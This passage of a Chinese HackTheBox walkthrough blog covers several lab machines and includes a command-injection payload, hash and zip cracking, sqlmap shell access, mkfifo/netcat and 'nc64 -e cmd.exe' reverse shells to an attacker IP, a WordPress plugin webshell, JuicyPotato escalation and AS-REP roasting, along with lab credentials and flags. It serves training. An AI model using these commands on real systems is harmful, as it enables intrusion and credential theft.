__readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;\n------------------\n: EV Bug Tracker :\n------------------\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Provide Bug ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;---------------\n\n&quot;</span>);</span><br><span class="line">  v3 = geteuid();</span><br><span class="line">  setuid(v3);</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)concat(<span class="string">&quot;cat /root/reports/&quot;</span>, v7);</span><br><span class="line">  system(v4);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>用户输入<code>v7</code></li>
+<li><code>v7</code>被拼接到&quot;cat /root/reports/&quot;之后在赋值给<code>v4</code></li>
+<li>执行<code>v4</code></li>
+</ul>
+<p>命令注入</p>
+<p>Payload: <code>;cat$IFS$9/root/root.txt</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: ;cat$IFS<span class="variable">$9</span>/root/root.txt</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line">cat: /root/reports/: Is a directory</span><br><span class="line">af13b0bee69f8a877c3faf667f7beacf</span><br></pre></td></tr></table></figure>
+<hr />
+<h1 id="hackthebox_archetype-2"><a class="markdownIt-Anchor" href="#hackthebox_archetype-2"></a> HackTheBox_Archetype</h1>
+<p>Linux</p>
+<h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.46</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.46</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2>
+<blockquote>
+<p>The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server. – 官方WP</p>
+</blockquote>
+<blockquote>
+<p>尝试使用上台靶机中获取的ftp凭据ftpuser/mc@F1l3ZilL4登录靶机的ftp服务<br />
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/qianxiaoyiran311/article/details/105988795">https://blog.csdn.net/qianxiaoyiran311/article/details/105988795</a></p>
+</blockquote>
+<p>得到FTP账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftpuser:mc@F1l3ZilL4</span><br></pre></td></tr></table></figure>
+<p>登入FTP服务</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.46</span><br><span class="line">Connected to 10.10.10.46.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.46:root): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get backup.zip</span><br><span class="line"><span class="built_in">local</span>: backup.zip remote: backup.zip</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> backup.zip (2533 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">2533 bytes received <span class="keyword">in</span> 0.23 secs (10.7549 kB/s)</span><br></pre></td></tr></table></figure>
+<p>爆破加密压缩包<code>backup.zip</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip backup.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u</span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw &#x3D;&#x3D; 741852963</span><br></pre></td></tr></table></figure>
+<p>查看<code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>爆破Hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span> &gt; passwd</span><br><span class="line">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwd</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-MD5 [MD5 256/256 AVX2 8x3])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=2</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">qwerty789        (?)</span><br><span class="line">1g 0:00:00:00 DONE (2021-06-05 19:16) 33.33g/s 3340Kp/s 3340Kc/s 3340KC/s shunda..pogimo</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-MD5&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session complete</span><br></pre></td></tr></table></figure>
+<p>登入Web页面, 看到一个搜索功能<br />
+使用sqlmap来getshell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.46/dashboard.php?search=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
+<p>sqlmap给出的shell不是很好用, 自己再弹个Shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.51 9996 &gt;/tmp/y</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2>
+<p>查看数据库信息</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/dashboard.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = pg_connect(<span class="string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>得到账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres:P@s5w0rd!</span><br></pre></td></tr></table></figure>
+<p>SSH登入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh postgres@10.10.10.46</span><br><span class="line">P@s5w0rd!</span><br></pre></td></tr></table></figure>
+<p>查看sudo权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> postgres: P@s5w0rd!</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> postgres on vaccine:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User postgres may run the following commands on vaccine:</span><br><span class="line">    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br></pre></td></tr></table></figure>
+<p>vi提权</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">dd6e058e814260bc70e9bbdef2715849</span><br></pre></td></tr></table></figure>
+<hr />
+<blockquote>
+<p>来自上一台靶机的FTP账户</p>
+</blockquote>
+<p>本着实践出真知的精神, 再看了一下上一台靶机<strong>Oopsie</strong>的端口开放情况</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1205/mysqld         </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      800/systemd-resolve </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1120/sshd           </span><br><span class="line">tcp        0    235 10.10.10.28:41042       10.10.16.51:9996        ESTABLISHED 2166/python3        </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      1260/apache2        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      1120/sshd           </span><br><span class="line">tcp6       0      0 10.10.10.28:80          10.10.16.51:58936       ESTABLISHED 1963/apache2</span><br></pre></td></tr></table></figure>
+<p>并没有FTP服务, 那么就是可能这种靶机顺序关系的变更</p>
+<p>我个人不是很认同这种把敏感信息放在其他靶机泄露的设计<br />
+确切来说, <strong>不应该把这种通过其他靶机泄露敏感信息作为唯一的攻击链</strong><br />
+在给出这样的一条攻击链的时候应该再给出另外一个攻击链<br />
+虽然这样的确能够对于连续的靶机渗透, 或者说多层靶机渗透的带来更加贯通的体验<br />
+但是出现了这种顺序变更的情况之后就会显得十分弄巧成拙, 而且没有应有的后续修改<br />
+没有<strong>user.txt</strong>也只是给这台机器的2.7分锦上添花了</p>
+<hr />
+<h1 id="hackthebox_shield"><a class="markdownIt-Anchor" href="#hackthebox_shield"></a> HackTheBox_Shield</h1>
+<p>Windows</p>
+<h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.29</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.29</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<h2 id="路径扫描"><a class="markdownIt-Anchor" href="#路径扫描"></a> 路径扫描</h2>
+<p>扫描到路径<code>/wordpress</code><br />
+<s>其实根本没扫, 网络环境太差了, 直接看WP的</s></p>
+<h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.29/wordpress/ -e u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+<p>使用上一台靶机的密码<code>P@s5w0rd!</code><br />
+得到账户<code>admin:P@s5w0rd!</code><br />
+<s>拳头硬了</s></p>
+<p>登入之后修改插件的代码<br />
+直接写个Shell进去<br />
+然后访问<code>/wordpress/wp-content/plugins/mesmerize-companion/src/Companion.php</code>即可</p>
+<h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2>
+<p>蚁剑连WebShell<br />
+上传nc再弹Shell回来</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe -e C:\windows\system32\cmd.exe 10.10.16.51 9996</span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 SHIELD</span><br><span class="line">OS Name:                   Microsoft Windows Server 2016 Standard</span><br><span class="line">OS Version:                10.0.14393 N/A Build 14393</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Member Server</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00376-30000-00299-AA303</span><br><span class="line">Original Install Date:     2/4/2020, 12:58:01 PM</span><br><span class="line">System Boot Time:          6/5/2021, 8:21:33 PM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume2</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 753 MB</span><br><span class="line">Virtual Memory: Max Size:  2,431 MB</span><br><span class="line">Virtual Memory: Available: 1,015 MB</span><br><span class="line">Virtual Memory: In Use:    1,416 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    MEGACORP.LOCAL</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.29</span><br><span class="line">                                 [02]: fe80::98f9:2cd0:ff27:3fbc</span><br><span class="line">                                 [03]: dead:beef::98f9:2cd0:ff27:3fbc</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>
+<p>没有打补丁的Windows Server 2016 Standard<br />
+用烂土豆提权<br />
+<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p>
+<p>写一个反弹Shell的bat脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> start C:\temp\nc64.exe -e cmd.exe 10.10.16.51 9995 &gt; C:\temp\shell.bat</span><br></pre></td></tr></table></figure>
+<p>当时因为用linux的习惯就用了双引号把要写入的内容括了起来, 但是Windows会很蛋疼得把双引号也写入, 然后就导致了当时一直不能提权</p>
+<p>看一下权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name          Description                               State  </span><br><span class="line">======================= ========================================= =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking                  Enabled</span><br><span class="line">SeImpersonatePrivilege  Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects                     Enabled</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t<br />
+如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u<br />
+如果均开启，可以选择-t *<br />
+如果均未开启，那么无法提权<br />
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/god_zzZ/article/details/106334702">https://blog.csdn.net/god_zzZ/article/details/106334702</a></p>
+</blockquote>
+<p>然后在项目上找一个Windows Server 2016 Standard的CLSID</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p C:\temp\shell.bat -l 6666 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">6e9a9fdc6f64e410a68b847bb4b404fa</span><br></pre></td></tr></table></figure>
+<hr />
+<h1 id="hackthebox_pathfinder"><a class="markdownIt-Anchor" href="#hackthebox_pathfinder"></a> HackTheBox_Pathfinder</h1>
+<p>对于域控的攻击有点超出的我的知识范围了</p>
+<h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -p 1-10000 10.10.10.30</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.30</span><br><span class="line">Host is up (0.57s latency).</span><br><span class="line">Not shown: 9987 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-08 13:22:07Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>使用上一台靶机的凭证<code>sandra:Password1234!</code>来枚举AD的信息 – 官方WP</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d megacorp.local -u sandra -p <span class="string">&quot;Password1234!&quot;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
+<p>json打包为zip后放进bloodhound<br />
+自己用在kali用bloodhound的时候总是莫名其妙的崩溃, 只能在windows上使用了<br />
+需要改一下neo4j所监听的ip, 默认是监听本地环回, 需要改成一个windows上能够访问到的ip</p>
+<p>通过分析<code>Find Principals with DCSync Rights</code><br />
+可以看到用户SVC_BES有权限<code>GetChanges</code>&amp;<code>GetchangesAll</code></p>
+<blockquote>
+<p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz”<br />
+<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a></p>
+</blockquote>
+<blockquote>
+<p>mimikatz有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />
+《内网安全攻防》 P.296</p>
+</blockquote>
+<p>如果能够拿到用户<code>svc_bes</code>的凭证, 就能够使用dcsync攻击<br />
+所以尝试获取用户<code>svc_bes</code>的Hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> svc_bes</span><br><span class="line">$krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL:9b7a931e1152a4631d23173e921373ee<span class="variable">$7282d47fdf6ebddcd09f8233636ee97c971b39333ded23097d3fb59c4fb1dfbd772cb3b08b8a8f40a69f69a07f242e0ee2520878b707ab9769208ba2bd6faa76c0a79b39384ef588651127c3164fff013b53d0968d4047dad049b46747b52629c6c9b92427fc7bd6dca13a923bdb833ca9273c2018b605a9eeb0c24005b5ba8988b76952db3a31f6b14f165bd0613e7130ee1bc93cb9a0e4f7a018cbf3913b935778e860d3236d2763b56d871e236e98ea041bbb5b15ebf3138ca16214a758b24194d968320151e58d09a89c2d08e4576ab789076cba4096b4fb328965611663cbe588eafd5bf19af71293701d8a220e</span></span><br></pre></td></tr></table></figure>
+<p>爆破Hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">Sheffield19      ($krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL)</span><br></pre></td></tr></table></figure>
+<p>这里本来打算用psexec直接登入, 但是出现了权限不足的错误<br />
+<s><code>python psexec.py megacorp.local/svc_bes@10.10.10.30</code></s></p>
+<p>使用Winrm服务登入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19</span><br><span class="line"><span class="built_in">type</span> C:\users\svc_bes\desktop\user.txt</span><br><span class="line">b05fb166688a8603d970c6d033f637f1</span><br></pre></td></tr></table></figure>
+<p>dcsync攻击</p>
